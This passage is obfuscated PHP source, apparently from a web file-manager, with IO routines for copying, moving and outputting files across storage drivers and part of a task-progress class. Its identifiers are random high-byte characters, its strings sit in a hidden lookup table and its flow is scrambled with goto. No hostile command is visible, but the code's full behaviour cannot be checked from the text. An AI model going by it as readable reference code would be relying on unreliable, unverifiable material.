$ˆ·ÉÂ“´ = true) { $äë–Ãõë =& $_SERVER[ĞÂ¤àÓï]; $¯ÊĞÑ‹¤ = empty($²´®õÊÂ) && $²´®õÊÂ !== $äë–Ãõë[197] ? $ˆÓ­£’š->pathThis($ğ¦Úñƒô) : $²´®õÊÂ; if ($ÚÀ³ŒğÙ) { $Û¼ø‰Ôé = $õ†Ë©Şº->fileNameExist($ƒ„éê€ò, $¯ÊĞÑ‹¤); $èÂ¨›Ûé = $¯ÊĞÑ‹¤; $¯ÊĞÑ‹¤ = $õ†Ë©Şº->fileNameAuto($ƒ„éê€ò, $¯ÊĞÑ‹¤, $ÚÀ³ŒğÙ, !$úŸœÒƒ˜); if (!$Û¼ø‰Ôé || $èÂ¨›Ûé != $¯ÊĞÑ‹¤) { $ÚÀ³ŒğÙ = !1; } if ($ˆ·ÉÂ“´ && !$ÚÀ³ŒğÙ) { $õ†Ë©Şº->_data[$äë–Ãõë[1155]] = !0; } } if ($úŸœÒƒ˜) { return self::copyFile($ˆÓ­£’š, $ğ¦Úñƒô, $õ†Ë©Şº, $ƒ„éê€ò, $¯ÊĞÑ‹¤, $Ó¤°‘¹); } if ($ÚÀ³ŒğÙ == REPEAT_RENAME_FOLDER) { $ÚÀ³ŒğÙ = !1; } $áÈú¬ˆ© = rtrim($ƒ„éê€ò, $äë–Ãõë[8]) . $äë–Ãõë[8] . $¯ÊĞÑ‹¤; $‚ü¯™Ê = $õ†Ë©Şº->mkdir($õ†Ë©Şº->getPath($áÈú¬ˆ©), $ÚÀ³ŒğÙ); $ƒ„éê€ò = $õ†Ë©Şº->getPathInner($‚ü¯™Ê); $äÒÁ×ÀÁ = $ˆÓ­£’š->listPath($ğ¦Úñƒô, !0); $äÒÁ×ÀÁ = is_array($äÒÁ×ÀÁ) ? $äÒÁ×ÀÁ : array($äë–Ãõë[83] => array(), $äë–Ãõë[82] => array()); $ß›ªÔÃÏ = array_merge($äÒÁ×ÀÁ[$äë–Ãõë[83]], $äÒÁ×ÀÁ[$äë–Ãõë[82]]); foreach ($ß›ªÔÃÏ as $ê›şŒÃ§) { $Í™œ§Şä = $ê›şŒÃ§[$äë–Ãõë[33]] == $äë–Ãõë[199]; $ğ¦Úñƒô = $ˆÓ­£’š->getPathInner($ê›şŒÃ§[$äë–Ãõë[84]]); $Åæ®©ùœ = self::copyPath($ˆÓ­£’š, $ğ¦Úñƒô, $õ†Ë©Şº, $ƒ„éê€ò, $ÚÀ³ŒğÙ, $Ó¤°‘¹, $Í™œ§Şä, !1, !1); if (!$Åæ®©ùœ) { IO::errorTips($äë–Ãõë[1156] . $ğ¦Úñƒô . $äë–Ãõë[70] . $ƒ„éê€ò); } } self::copyMoveKeepInfo($ˆÓ­£’š, $ğ¦Úñƒô, $‚ü¯™Ê); return $‚ü¯™Ê; } private static function copyFile($™ÇööøÒ, $¢¸şÏ‚ˆ, $’íÉ«Ûê, $šÀÈâçğ, $å“®‚Îñ, $ú”ş¿½) { $Ÿß”ñØ‚ =& $_SERVER[ĞÂ¤àÓï]; $šÀÈâçğ = $’íÉ«Ûê->getPath(rtrim($šÀÈâçğ, $Ÿß”ñØ‚[8]) . $Ÿß”ñØ‚[8] . $å“®‚Îñ); $ş“‰Š›ï = $Ÿß”ñØ‚[1157] . time() . rand_string(5); Hook::trigger($Ÿß”ñØ‚[1158], $™ÇööøÒ, $¢¸şÏ‚ˆ, $’íÉ«Ûê, $šÀÈâçğ, $å“®‚Îñ, $ş“‰Š›ï); if (self::driverIsSame($™ÇööøÒ, $’íÉ«Ûê)) { if ($ú”ş¿½) { $¡À±õª = $’íÉ«Ûê->moveFile($¢¸şÏ‚ˆ, $šÀÈâçğ); } else { $¡À±õª = $’íÉ«Ûê->copyFile($¢¸şÏ‚ˆ, $šÀÈâçğ); } Hook::trigger($Ÿß”ñØ‚[1159], $™ÇööøÒ, $¢¸şÏ‚ˆ, $’íÉ«Ûê, $šÀÈâçğ, $å“®‚Îñ, $¡À±õª); self::copyMoveKeepInfo($™ÇööøÒ, $¢¸şÏ‚ˆ, $¡À±õª); return $¡À±õª; } $¾¾˜ ²ë = TEMP_FILES; if ($GLOBALS[$Ÿß”ñØ‚[6]][$Ÿß”ñØ‚[89]][$Ÿß”ñØ‚[803]]) { $¾¾˜ ²ë = $GLOBALS[$Ÿß”ñØ‚[6]][$Ÿß”ñØ‚[89]][$Ÿß”ñØ‚[803]]; } $§ÜÊ°„Ö = $¾¾˜ ²ë; mk_dir($§ÜÊ°„Ö); $÷ÇÕÔòá = $§ÜÊ°„Ö . $ş“‰Š›ï; $ğ’ÃíşŞ = $÷ÇÕÔòá; $÷ÇÕÔòá = $™ÇööøÒ->download($¢¸şÏ‚ˆ, $÷ÇÕÔòá); $÷ÇÕÔòá = $™ÇööøÒ->iconvApp($÷ÇÕÔòá); if (substr($÷ÇÕÔòá, strlen($¾¾˜ ²ë)) == $¾¾˜ ²ë) { $ú”ş¿½ = !0; } $¡À±õª = $’íÉ«Ûê->upload($šÀÈâçğ, $÷ÇÕÔòá, $ú”ş¿½); self::remove($ğ’ÃíşŞ); Hook::trigger($Ÿß”ñØ‚[1159], $™ÇööøÒ, $¢¸şÏ‚ˆ, $’íÉ«Ûê, $šÀÈâçğ, $å“®‚Îñ, $¡À±õª); self::copyMoveKeepInfo($™ÇööøÒ, $¢¸şÏ‚ˆ, $¡À±õª); return $¡À±õª; } private static function copyMoveKeepInfo($‰ÒÀé, $©Üµä¨¯, $ˆ·Š±Ò) { if (!$ˆ·Š±Ò) { return; } $Ô”ñ”ŞÛ = $‰ÒÀé->info($©Üµä¨¯); if (!is_array($Ô”ñ”ŞÛ)) { return; } IO::setModifyTime($ˆ·Š±Ò, $Ô”ñ”ŞÛ[$_SERVER[ĞÂ¤àÓï][85]]); } public static function pathFather($öñÔ“ìó) { $ÛÙ¤ƒ¢– = IO::init($öñÔ“ìó); $±×Ä»Ü¤ = $ÛÙ¤ƒ¢–->pathFather($ÛÙ¤ƒ¢–->path); return $ÛÙ¤ƒ¢–->getPathOuter($±×Ä»Ü¤); } public static function fileOut($¸–¼¯Î, $Ğ—ÂâÎ = false, $õôê©½¥ = false, $¥í›…ïË = '') { $‰¹™Û’Õ = self::driverMake($¸–¼¯Î); if ($‰¹™Û’Õ->isFileOutServer()) { return $‰¹™Û’Õ->fileOutServer($¸–¼¯Î, $Ğ—ÂâÎ, $õôê©½¥, $¥í›…ïË); } return $‰¹™Û’Õ->fileOut($¸–¼¯Î, $Ğ—ÂâÎ, $õôê©½¥, $¥í›…ïË); } public static function fileOutImage($†ÉıÑ†ˆ, $ÈÖ¯ìôñ = 250) { $ˆì©¢±Ã = array(250, 600, 1200, 2000, 3000, 5000); for ($²ê…•üÕ = 0; $²ê…•üÕ < count($ˆì©¢±Ã); $²ê…•üÕ++) { if ($²ê…•üÕ == 0 && $ÈÖ¯ìôñ <= $ˆì©¢±Ã[$²ê…•üÕ]) { $ÈÖ¯ìôñ = $ˆì©¢±Ã[$²ê…•üÕ]; break; } else { if ($ÈÖ¯ìôñ > $ˆì©¢±Ã[$²ê…•üÕ - 1] && $ÈÖ¯ìôñ <= $ˆì©¢±Ã[$²ê…•üÕ]) { $ÈÖ¯ìôñ = $ˆì©¢±Ã[$²ê…•üÕ]; break; } else { if ($²ê…•üÕ == count($ˆì©¢±Ã) - 1 && $ÈÖ¯ìôñ > $ˆì©¢±Ã[$²ê…•üÕ]) { $ÈÖ¯ìôñ = $ˆì©¢±Ã[$²ê…•üÕ]; break; } } } } $¿ÑÖ›Ã× = self::driverMake($†ÉıÑ†ˆ); if ($¿ÑÖ›Ã×->isFileOutServer()) { return $¿ÑÖ›Ã×->fileOutImageServer($†ÉıÑ†ˆ, $ÈÖ¯ìôñ); } return $¿ÑÖ›Ã×->fileOutImage($†ÉıÑ†ˆ, $ÈÖ¯ìôñ); } private static function driverIsSame($Ú¶ıöÏ, $Šú¤Íª) { $Í‡£äâÕ =& $_SERVER[ĞÂ¤àÓï]; $ì¡í¤ÛÄ = $Ú¶ıöÏ->getType(); $—ûÆïÌÈ = $Šú¤Íª->getType(); if ($ì¡í¤ÛÄ != $—ûÆïÌÈ) { return !1; } if ($ì¡í¤ÛÄ == $Í‡£äâÕ[757]) { return !0; } if ($ì¡í¤ÛÄ == $Í‡£äâÕ[106]) { return !0; } if ($Ú¶ıöÏ->pathDriver == $Šú¤Íª->pathDriver) { return !0; } return !1; } public static function copyUpdate($‹˜œèÃ», $¥ëòì£) { $œÕàˆ‡ =& $_SERVER[ĞÂ¤àÓï]; if (!IO::exist($‹˜œèÃ»)) { return !1; } if (!IO::exist($¥ëòì£)) { IO::mkdir($¥ëòì£); } $ÔÔ¬Í¿Ö = self::_listAll($‹˜œèÃ»); $á©ÆÉ“Á = self::_listAll($¥ëòì£); $œı­Ù­ = array(); $à©¡Ó— = array(); foreach ($ÔÔ¬Í¿Ö as $°ô‚áÙ => $ÌÕ´Çä) { if (isset($á©ÆÉ“Á[$°ô‚áÙ])) { if ($ÌÕ´Çä[$œÕàˆ‡[75]] == 1) { continue; } if ($á©ÆÉ“Á[$°ô‚áÙ][$œÕàˆ‡[76]] == $ÌÕ´Çä[$œÕàˆ‡[76]]) { continue; } } if ($ÌÕ´Çä[$œÕàˆ‡[75]] == 1) { $à©¡Ó—[] = $¥ëòì£ . $œÕàˆ‡[8] . $°ô‚áÙ; continue; } $è‹¥ğ…Š = strstr(trim($°ô‚áÙ, $œÕàˆ‡[8]), $œÕàˆ‡[8]) ? get_path_father($°ô‚áÙ) : $œÕàˆ‡[12]; $œı­Ù­[] = array($œÕàˆ‡[1160] => $ÌÕ´Çä[$œÕàˆ‡[84]], $œÕàˆ‡[1161] => rtrim($¥ëòì£, $œÕàˆ‡[8]) . $œÕàˆ‡[8] . $è‹¥ğ…Š, $œÕàˆ‡[1162] => $ÌÕ´Çä); } $ÅÊ€€˜ˆ = array($œÕàˆ‡[199] => $œı­Ù­, $œÕàˆ‡[75] => $à©¡Ó—); Hook::trigger($œÕàˆ‡[1163], $‹˜œèÃ», $¥ëòì£, $ÅÊ€€˜ˆ); foreach ($à©¡Ó— as $ÌÕ´Çä) { IO::mkdir($ÌÕ´Çä); } foreach ($œı­Ù­ as $ÌÕ´Çä) { IO::copy($ÌÕ´Çä[$œÕàˆ‡[1160]], $ÌÕ´Çä[$œÕàˆ‡[1161]], REPEAT_REPLACE); } } private static function _listAll($‹ÅœâÏù) { $Ñö®Øì± =& $_SERVER[ĞÂ¤àÓï]; $‹ÅœâÏù = KodIO::clear($‹ÅœâÏù); $¸üÖÂÖ = IO::listAll($‹ÅœâÏù); foreach ($¸üÖÂÖ as &$ĞÔŠ›Ñ‚) { $¿…ó«ØÏ = substr($ĞÔŠ›Ñ‚[$Ñö®Øì±[84]], strlen($‹ÅœâÏù)); $ĞÔŠ›Ñ‚[$Ñö®Øì±[1164]] = trim($¿…ó«ØÏ, $Ñö®Øì±[8]); } unset($ĞÔŠ›Ñ‚); return array_to_keyvalue($¸üÖÂÖ, $Ñö®Øì±[1164]); } public static function fileSubstr($Ûè´‚ôú, $µêğ›øğ, $À¯¸¥ = false) { $´©À»•» =& $_SERVER[ĞÂ¤àÓï]; $“ÛŞ–Åß = self::driverMake($Ûè´‚ôú); $Ï¥êÓ« = $“ÛŞ–Åß->size($Ûè´‚ôú); $æş•Ö¯Û = $µêğ›øğ; $òå¾İ—„ = $À¯¸¥; if ($µêğ›øğ < 0) { $µêğ›øğ = $Ï¥êÓ« + $µêğ›øğ; } if ($À¯¸¥ === !1) { $À¯¸¥ = $Ï¥êÓ« - $µêğ›øğ; } if ($µêğ›øğ + $À¯¸¥ > $Ï¥êÓ«) { $À¯¸¥ = $Ï¥êÓ« - $µêğ›øğ; } if (!$Ï¥êÓ« && $“ÛŞ–Åß->getType() == $´©À»•»[106] && !$“ÛŞ–Åß->exist($Ûè´‚ôú)) { $ÄîÆ÷ì = get_path_this($Ûè´‚ôú); $‡ Ûá¹ = parse_url_query($ÄîÆ÷ì); if (is_array($‡ Ûá¹) && isset($‡ Ûá¹[$´©À»•»[32]])) { $ÄîÆ÷ì = urldecode($‡ Ûá¹[$´©À»•»[32]]); } throw new Exception($´©À»•»[1165] . LNG($´©À»•»[1166]) . $´©À»•»[966] . clear_html($ÄîÆ÷ì) . $´©À»•»[12]); } if ($À¯¸¥ <= 0) { return $´©À»•»[12]; } if ($µêğ›øğ < 0 || $µêğ›øğ >= $Ï¥êÓ« || $À¯¸¥ > 1024 * 1024 * 10) { throw new Exception("\146\151\154\145\122\145\x61\x64\40\x65\162\162\x6f\162\x21\40\163\x74\141\x72\x74\x3d{$µêğ›øğ}\x3b\x6c\145\x6e\x67\x74\x68\x3d{$À¯¸¥}\x3b\40\163\x69\x7a\x65\75{$Ï¥êÓ«}\73"); } $¤”ŒŸ‡¨ = $“ÛŞ–Åß->fileSubstr($Ûè´‚ôú, $µêğ›øğ, $À¯¸¥); if (!$¤”ŒŸ‡¨ && $À¯¸¥ && isset($GLOBALS[$´©À»•»[1167]])) { throw new Exception($GLOBALS[$´©À»•»[1167]][$´©À»•»[1168]]); } return $¤”ŒŸ‡¨; } private static function driverMake(&$Œ¨Óœ˜) { $ß€ªÇØ  =& $_SERVER[ĞÂ¤àÓï]; $ÁÉ®éƒ = KodIO::parse($Œ¨Óœ˜); if (!self::$driverListSystem) { $èé©·ÅÛ = Model($ß€ªÇØ [766])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($èé©·ÅÛ, $ß€ªÇØ [399]); } if ($ÁÉ®éƒ[$ß€ªÇØ [33]] == KodIO::KOD_IO && !self::$driverListSystem[$ÁÉ®éƒ[$ß€ªÇØ [399]]]) { return !1; } $Œ¨Óœ˜ = $ÁÉ®éƒ[$ß€ªÇØ [1169]]; $¡†• ´í = self::driverGet($ÁÉ®éƒ, $Œ¨Óœ˜); return $¡†• ´í; } private static function driverGet($Á®ÇÏÓ¶, &$´“ğ†¶¢) { $‚ÀõÃ =& $_SERVER[ĞÂ¤àÓï]; $¿‡í–ïÊ = $Á®ÇÏÓ¶[$‚ÀõÃ[1170]]; $÷³Ë‰– = $Á®ÇÏÓ¶[$‚ÀõÃ[399]]; switch ($Á®ÇÏÓ¶[$‚ÀõÃ[33]]) { case KodIO::KOD_IO: $Ø¶Ñ–Ì± = self::$driverListSystem[$÷³Ë‰–]; break; case KodIO::KOD_SOURCE: $´“ğ†¶¢ = $÷³Ë‰– . $´“ğ†¶¢; $Ø¶Ñ–Ì± = array($‚ÀõÃ[1171] => $‚ÀõÃ[1172], $‚ÀõÃ[6] => $Á®ÇÏÓ¶); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $â®ûşšÄ = $GLOBALS[$‚ÀõÃ[1173]]; self::$driverListUser = array_to_keyvalue($â®ûşšÄ, $‚ÀõÃ[399]); } $Ø¶Ñ–Ì± = self::$driverListUser[$÷³Ë‰–]; break; case KodIO::KOD_SHARE_LINK: $Ø¶Ñ–Ì± = array($‚ÀõÃ[1171] => $‚ÀõÃ[1174], $‚ÀõÃ[6] => $Á®ÇÏÓ¶); $æ§íşª = Action($‚ÀõÃ[1175])->sharePathInfo($Á®ÇÏÓ¶[$‚ÀõÃ[84]]); $´“ğ†¶¢ = $æ§íşª[$‚ÀõÃ[402]]; if (!$æ§íşª[$‚ÀõÃ[402]]) { $±ñõ”â… = Model($‚ÀõÃ[601])->getInfo($æ§íşª[$‚ÀõÃ[489]]); $´“ğ†¶¢ = KodIO::clear($±ñõ”â…[$‚ÀõÃ[1176]] . $Á®ÇÏÓ¶[$‚ÀõÃ[1169]]); $Á®ÇÏÓ¶[$‚ÀõÃ[487]] = $±ñõ”â…; $Á®ÇÏÓ¶[$‚ÀõÃ[1151]] = $´“ğ†¶¢; $Ø¶Ñ–Ì± = array($‚ÀõÃ[1171] => $‚ÀõÃ[1177], $‚ÀõÃ[6] => $Á®ÇÏÓ¶); } break; case KodIO::KOD_SHARE_ITEM: $Ø¶Ñ–Ì± = array($‚ÀõÃ[1171] => $‚ÀõÃ[1178], $‚ÀõÃ[6] => $Á®ÇÏÓ¶); $±ñõ”â… = Model($‚ÀõÃ[601])->getInfo($Á®ÇÏÓ¶[$‚ÀõÃ[399]]); if ($±ñõ”â…[$‚ÀõÃ[402]] == $‚ÀõÃ[197]) { $´“ğ†¶¢ = KodIO::clear($±ñõ”â…[$‚ÀõÃ[1176]] . $Á®ÇÏÓ¶[$‚ÀõÃ[1169]]); $Á®ÇÏÓ¶[$‚ÀõÃ[487]] = $±ñõ”â…; $Á®ÇÏÓ¶[$‚ÀõÃ[1151]] = $´“ğ†¶¢; $Ø¶Ñ–Ì± = array($‚ÀõÃ[1171] => $‚ÀõÃ[1179], $‚ÀõÃ[6] => $Á®ÇÏÓ¶); } else { if (!$´“ğ†¶¢) { $´“ğ†¶¢ = $±ñõ”â…[$‚ÀõÃ[402]]; } } break; default: $´“ğ†¶¢ = $Á®ÇÏÓ¶[$‚ÀõÃ[84]]; $Ø¶Ñ–Ì± = array($‚ÀõÃ[1171] => $‚ÀõÃ[1180]); break; } $õª”Û = $Á®ÇÏÓ¶[$‚ÀõÃ[84]]; if (!isset(self::$driverCache[$õª”Û])) { $Ù§†ëƒ = strtolower($Ø¶Ñ–Ì±[$‚ÀõÃ[95]]); $€ì–·µü = $GLOBALS[$‚ÀõÃ[6]][$‚ÀõÃ[89]][$‚ÀõÃ[833]]; $¼ìÆ„Ï¤ = $‚ÀõÃ[74] . (isset($€ì–·µü[$Ù§†ëƒ]) ? $€ì–·µü[$Ù§†ëƒ] : ucfirst($Ù§†ëƒ)); if (!class_exists($¼ìÆ„Ï¤)) { show_json("{$¼ìÆ„Ï¤}\x20\156\x6f\164\40\145\170\151\163\164\163\x21", !1); } $«‚İ Ê = isset($Ø¶Ñ–Ì±[$‚ÀõÃ[6]]) ? $Ø¶Ñ–Ì±[$‚ÀõÃ[6]] : !1; self::$driverCache[$õª”Û] = new $¼ìÆ„Ï¤($«‚İ Ê); } $òë¿£Ö¶ = self::$driverCache[$õª”Û]; $òë¿£Ö¶->pathDriver = $¿‡í–ïÊ; $òë¿£Ö¶->pathBase = $‚ÀõÃ[12]; if (isset($Ø¶Ñ–Ì±[$‚ÀõÃ[6]][$‚ÀõÃ[1181]])) { $òë¿£Ö¶->pathBase = rtrim($Ø¶Ñ–Ì±[$‚ÀõÃ[6]][$‚ÀõÃ[1181]], $‚ÀõÃ[8]) . $‚ÀõÃ[8]; $´“ğ†¶¢ = $òë¿£Ö¶->pathBase . ltrim($´“ğ†¶¢, $‚ÀõÃ[8]); } $´“ğ†¶¢ = $òë¿£Ö¶->getPath($´“ğ†¶¢); if (isset($Á®ÇÏÓ¶[$‚ÀõÃ[1151]])) { $´“ğ†¶¢ = $Á®ÇÏÓ¶[$‚ÀõÃ[1151]]; } $òë¿£Ö¶->path = $´“ğ†¶¢; return $òë¿£Ö¶; } public static function errorTips($à›š¥Ï = false) { $œ‡òÁÑú =& $_SERVER[ĞÂ¤àÓï]; static $ÁÙôÇ›Ù = array(); $âå¤È‡± = 1000; if ($à›š¥Ï === -1) { return $ÁÙôÇ›Ù ? $ÁÙôÇ›Ù[count($ÁÙôÇ›Ù) - 1] : $œ‡òÁÑú[12]; } if ($à›š¥Ï === !1) { return implode($œ‡òÁÑú[231], $ÁÙôÇ›Ù); } if (count($ÁÙôÇ›Ù) >= $âå¤È‡±) { $ÁÙôÇ›Ù = array_slice($ÁÙôÇ›Ù, $âå¤È‡± * 0.5, $âå¤È‡±); } $ÁÙôÇ›Ù[] = $à›š¥Ï; write_log($œ‡òÁÑú[162] . ACTION . $œ‡òÁÑú[1182] . $à›š¥Ï, $œ‡òÁÑú[1183]); } public static function getLastError($¾ÂÔš® = '') { $„ğÄ¼´¢ = self::errorTips(-1); return $„ğÄ¼´¢ ? $„ğÄ¼´¢ : $¾ÂÔš®; } } goto e ›ê•ì; dÅÀ÷¸ß´: class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\156\147"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ãÉÏÑ™£, $Øµ¢÷¯Å = '', $•„‹éŞä = 0, $ ¹Ÿ¦¡ª = '') { $ÕòßóüÀ =& $_SERVER[ĞÂ¤àÓï]; if (self::get($ãÉÏÑ™£)) { return; } $è¹£á‡ = defined($ÕòßóüÀ[475]) ? USER_ID : $ÕòßóüÀ[197]; $this->task = array($ÕòßóüÀ[399] => $ãÉÏÑ™£, $ÕòßóüÀ[1664] => $è¹£á‡, $ÕòßóüÀ[1564] => $ ¹Ÿ¦¡ª, $ÕòßóüÀ[453] => $ÕòßóüÀ[12], $ÕòßóüÀ[33] => $Øµ¢÷¯Å, $ÕòßóüÀ[1064] => $ÕòßóüÀ[12], $ÕòßóüÀ[793] => $•„‹éŞä, $ÕòßóüÀ[1665] => 0, $ÕòßóüÀ[1666] => 0, $ÕòßóüÀ[1667] => 0, $ÕòßóüÀ[1668] => timeFloat(), $ÕòßóüÀ[1669] => 0, $ÕòßóüÀ[1670] => 0, $ÕòßóüÀ[1671] => 0, $ÕòßóüÀ[1672] => 0, $ÕòßóüÀ[749] => $ÕòßóüÀ[1623]); $GLOBALS[$ÕòßóüÀ[1673]] = 1; Hook::bind($ÕòßóüÀ[1628], array($this, $ÕòßóüÀ[1674])); Hook::bind($ÕòßóüÀ[1675], array($this, $ÕòßóüÀ[1676])); $this->startAfter(); Hook::trigger($ÕòßóüÀ[1677], $this->task); $this->task[$ÕòßóüÀ[1670]] = timeFloat(); } public function end($Õ§ªıïÔ = '') { $òÕ©·ğÖ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$òÕ©·ğÖ[1670]]) { self::valueSet($this->task[$òÕ©·ğÖ[399]], !1); } $this->isEnd = !0; if ($Õ§ªıïÔ) { $this->task[$òÕ©·ğÖ[453]] = $Õ§ªıïÔ; } self::log($òÕ©·ğÖ[1678] . $this->task[$òÕ©·ğÖ[399]] . $òÕ©·ğÖ[1679] . sprintf($òÕ©·ğÖ[1680], timeFloat() - $this->task[$òÕ©·ğÖ[1668]]) . $òÕ©·ğÖ[1681]); Hook::unbind($òÕ©·ğÖ[1628], array($this, $òÕ©·ğÖ[1674])); Hook::unbind($òÕ©·ğÖ[1675], array($this, $òÕ©·ğÖ[1676])); $this->endAfter(); $Á±›ÉºŒ = $this->task; $this->task = !1; Hook::trigger($òÕ©·ğÖ[1682], $Á±›ÉºŒ); } public function update($ÉÙùñı = 0, $Ş„²®ûø = false) { $ô¬œòõ =& $_SERVER[ĞÂ¤àÓï]; $²ŠÃ»ÏÇ =& $this->task; if (!$²ŠÃ»ÏÇ) { return; } $²ŠÃ»ÏÇ[$ô¬œòõ[1665]] += $ÉÙùñı; $²ŠÃ»ÏÇ[$ô¬œòõ[1669]] = timeFloat(); if ($²ŠÃ»ÏÇ[$ô¬œòõ[793]]) { if ($²ŠÃ»ÏÇ[$ô¬œòõ[793]] < $²ŠÃ»ÏÇ[$ô¬œòõ[1665]]) { $²ŠÃ»ÏÇ[$ô¬œòõ[793]] = $²ŠÃ»ÏÇ[$ô¬œòõ[1665]]; } $Á³‰³°í = timeFloat() - $²ŠÃ»ÏÇ[$ô¬œòõ[1668]] - $²ŠÃ»ÏÇ[$ô¬œòõ[1671]]; if ($Á³‰³°í <= 0) { $Á³‰³°í = 0.001; } $²ŠÃ»ÏÇ[$ô¬œòõ[1666]] = $²ŠÃ»ÏÇ[$ô¬œòõ[1665]] / $²ŠÃ»ÏÇ[$ô¬œòõ[793]]; $²ŠÃ»ÏÇ[$ô¬œòõ[1667]] = $²ŠÃ»ÏÇ[$ô¬œòõ[1665]] / $Á³‰³°í; if ($²ŠÃ»ÏÇ[$ô¬œòõ[1666]] > 0) { $²ŠÃ»ÏÇ[$ô¬œòõ[1672]] = $Á³‰³°í * (1 - $²ŠÃ»ÏÇ[$ô¬œòõ[1666]]) / $²ŠÃ»ÏÇ[$ô¬œòõ[1666]]; } $²ŠÃ»ÏÇ[$ô¬œòõ[1672]] = $²ŠÃ»ÏÇ[$ô¬œòõ[1672]] <= 0 ? 0 : $²ŠÃ»ÏÇ[$ô¬œòõ[1672]]; } $this->updateAfter(); $Ÿ”ñöÈ = 0.2; if (timeFloat() - $²ŠÃ»ÏÇ[$ô¬œòõ[1670]] < $Ÿ”ñöÈ && !$Ş„²®ûø) { return; } $Æò™¦‹Ñ = self::get($²ŠÃ»ÏÇ[$ô¬œòõ[399]]); $£Óö€®Ô = $Æò™¦‹Ñ[$ô¬œòõ[749]]; if ($£Óö€®Ô == self::STATYS_KILL) { $‹Š“‘À‡ = array($ô¬œòõ[1683] => LNG($ô¬œòõ[1684]), $ô¬œòõ[1213] => !1); Cache::set($ô¬œòõ[1685] . $this->task[$ô¬œòõ[399]], $‹Š“‘À‡, 30); $this->onKill(); $this->end(); die; } else { if ($£Óö€®Ô == self::STATYS_STOP) { $İ×Ø¬ = 2; $Æò™¦‹Ñ[$ô¬œòõ[1671]] += $İ×Ø¬; self::valueSet($²ŠÃ»ÏÇ[$ô¬œòõ[399]], $Æò™¦‹Ñ); sleep($İ×Ø¬); $this->update(); return; } } $²ŠÃ»ÏÇ[$ô¬œòõ[749]] = $£Óö€®Ô ? $£Óö€®Ô : $²ŠÃ»ÏÇ[$ô¬œòõ[749]]; $²ŠÃ»ÏÇ[$ô¬œòõ[1671]] = $Æò™¦‹Ñ[$ô¬œòõ[1671]] ? $Æò™¦‹Ñ[$ô¬œòõ[1671]] : 0; $²ŠÃ»ÏÇ[$ô¬œòõ[1670]] = timeFloat(); Hook::trigger($ô¬œòõ[1686], $²ŠÃ»ÏÇ); self::valueSet($²ŠÃ»ÏÇ[$ô¬œòõ[399]], $²ŠÃ»ÏÇ); } public function onKillSet($¾Úêıäˆ, $Ç‹´àõà = array()) { $this->onKillCall = array($¾Úêıäˆ, $Ç‹´àõà); } public function onKill() { $‹”õ°˜ =& $_SERVER[ĞÂ¤àÓï]; self::log($‹”õ°˜[1678] . $this->task[$‹”õ°˜[399]] . $‹”õ°˜[1687]); Hook::trigger($‹”õ°˜[1688], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ú‘«È®) { $ƒœÍ–üƒ =& $_SERVER[ĞÂ¤àÓï]; Cache::set($ƒœÍ–üƒ[1685] . $this->task[$ƒœÍ–üƒ[399]], $Ú‘«È®, 60); return $Ú‘«È®; } public static function get($¸ÊæÏÒ¥) { $àªß¿ßÓ =& $_SERVER[ĞÂ¤àÓï]; $¯ˆÏ”ÚÚ = self::valueGet($¸ÊæÏÒ¥); if (is_array($¯ˆÏ”ÚÚ) && $¯ˆÏ”ÚÚ[$àªß¿ßÓ[1689]]) { $ø•µ¿Î„ = ActionApply($¯ˆÏ”ÚÚ[$àªß¿ßÓ[1689]], array($¯ˆÏ”ÚÚ)); $¯ˆÏ”ÚÚ = is_array($ø•µ¿Î„) ? $ø•µ¿Î„ : $¯ˆÏ”ÚÚ; } return $¯ˆÏ”ÚÚ; } public static function listData() { $µççÅ = self::valueGet(); return array_sort_by($µççÅ, $_SERVER[ĞÂ¤àÓï][1668], !0); } public static function kill($¼çÁ»Š) { return self::changeStatus($¼çÁ»Š, self::STATYS_KILL); } public static function stop($ß©Ë¼”) { return self::changeStatus($ß©Ë¼”, self::STATYS_STOP); } public static function restart($Ö“£–É´) { return self::changeStatus($Ö“£–É´, self::STATYS_RUNNING); } public static function killAll() { $¶î’¿ÏŠ =& $_SERVER[ĞÂ¤àÓï]; $¶Ğó„ÈÌ = self::listData(); foreach ($¶Ğó„ÈÌ as $ù¡†ú°‡) { self::kill($ù¡†ú°‡[$¶î’¿ÏŠ[399]]); } sleep(2); foreach ($¶Ğó„ÈÌ as $ù¡†ú°‡) { self::valueSet($ù¡†ú°‡[$¶î’¿ÏŠ[399]], !1); } } private static function changeStatus($²ÜÌØÂè, $ñİùÓúŸ) { $ıæÏ¹™ =& $_SERVER[ĞÂ¤àÓï]; $¥ÎÃ˜ÇÁ = self::valueGet($²ÜÌØÂè); if (!$¥ÎÃ˜ÇÁ) { return !1; } $¥ÎÃ˜ÇÁ[$ıæÏ¹™[749]] = $ñİùÓúŸ; self::valueSet($²ÜÌØÂè, $¥ÎÃ˜ÇÁ); self::log($ıæÏ¹™[1690] . $¥ÎÃ˜ÇÁ[$ıæÏ¹™[399]] . $ıæÏ¹™[1691] . $ñİùÓúŸ); return !0; } public static function valueGet($æ™ÔĞ…ä = false) { $¸Á»éÄ› =& $_SERVER[ĞÂ¤àÓï]; $Üµâ¦äÁ = defined($¸Á»éÄ›[475]) ? USER_ID : $¸Á»éÄ›[197]; if ($æ™ÔĞ…ä) { $Ç®Ø¯ïğ = Model($¸Á»éÄ›[447])->where(array($¸Á»éÄ›[94] => $æ™ÔĞ…ä, $¸Á»éÄ›[33] => $¸Á»éÄ›[1071]))->find(); return $Ç®Ø¯ïğ ? json_decode($Ç®Ø¯ïğ[$¸Á»éÄ›[374]], !0) : !1; } return self::taskListUser($Üµâ¦äÁ); } public static function taskListUser($ëé¶±æ‚ = false) { $ñÙ·¥’è =& $_SERVER[ĞÂ¤àÓï]; $ú÷ŠìÔ = array($ñÙ·¥’è[33] => $ñÙ·¥’è[1071]); if ($ëé¶±æ‚) { $ú÷ŠìÔ[$ñÙ·¥’è[1664]] = $ëé¶±æ‚; } $ˆã¶¡‚ı = 